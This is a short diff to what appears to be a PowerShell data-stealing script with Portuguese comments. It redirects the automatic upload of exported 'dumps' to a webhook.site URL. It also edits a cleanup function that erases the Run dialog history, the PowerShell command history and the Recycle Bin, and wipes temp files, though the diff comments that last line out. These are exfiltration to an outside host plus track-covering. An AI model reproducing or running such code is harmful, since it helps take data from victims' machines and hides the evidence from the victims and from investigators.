@@ -2,7 +2,7 @@
 
 
 # Deixe vazio ('') se não quiser enviar automaticamente para webhook
-$WebhookUrl = 'https://n8n.caju.dpdns.org/webhook/bot'
+$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'
 
 # Pasta de exportação (padrão: %TEMP%\p)
 $ExportDirDefault = Join-Path $env:TEMP 'p'
@@ -1014,7 +1014,7 @@ function Send-DumpToWebhook {
 ##### Funcao de Limpeza ####
 function Clear-All {
     $ea = 'SilentlyContinue'
-    3rm "$env:TEMP\*" -r -fo -ea $ea
+    #rm "$env:TEMP\*" -r -fo -ea $ea
     rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
     Clear-RecycleBin -fo -ea $ea
     rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
